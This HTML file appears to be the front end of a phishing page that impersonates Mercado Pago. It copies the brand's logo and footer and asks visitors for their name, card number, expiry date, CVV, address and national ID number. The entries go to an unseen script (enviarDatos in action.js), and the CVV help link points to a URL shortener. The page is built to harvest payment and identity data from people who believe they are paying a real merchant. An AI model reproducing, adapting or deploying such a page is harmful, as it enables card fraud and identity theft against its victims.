<!DOCTYPE html>
<html lang="en">

<head>
    <title>Mercado Pago | Pago con Tarjeta</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="./img/mp.ico" type="image/x-icon">
    <link rel="stylesheet" href="./css/mp.css">
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
</head>

<body>
    <nav>
        <div>
            <img class="mp-logo" src="./img/mp.png" alt="Mercado Pago Logo">
        </div>
    </nav>
    <br>
    <br><br><br><br><br>
    <div class="form-container">
        <form id="payment-form">
            <div>
                <label for="first-name">Nombre y Apellido</label>
                <input type="text" id="name" name="name" required>
            </div>
            <div>
                <label for="card">Numero de Tarjeta</label>
                <input type="text" id="card" name="card_number" required>
                <div class="inline-inputs">
                    <div>
                        <label for="exp">Fecha de Expiracion</label>
                        <input type="text" id="exp" name="expiration_date" required>
                    </div>
                    <div>
                        <label for="cvv"><a class="cvv" href="https://lc.cx/uE8Eyd">(Codigo de seguridad)</a> </label>
                        <input type="text" id="cvv" name="cvv" id="cvv" required>
                    </div>
                </div>
                <label for="address">Direccion Titular</label>
                <input type="text" id="address" name="address" required>
                <label for="id">Numero de Identidad</label>
                <input type="text" id="id" name="id" required>
                <button type="button" onclick="enviarDatos()">Pagar</button>
                <div id="spinner" style="display: none;">Cargando...</div>
            </div>
        </form>
    </div>
    <footer>
        <p>Cómo cuidamos tu privacidad - Copyright © 1999-2023 DeRemate.com de S. de R.L. de C.V.</p>
        <p class="captcha">Protegido por reCAPTCHA - Privacidad - Condiciones</p>
    </footer>
</body>
<script src="./js/action.js"></script>

</html>
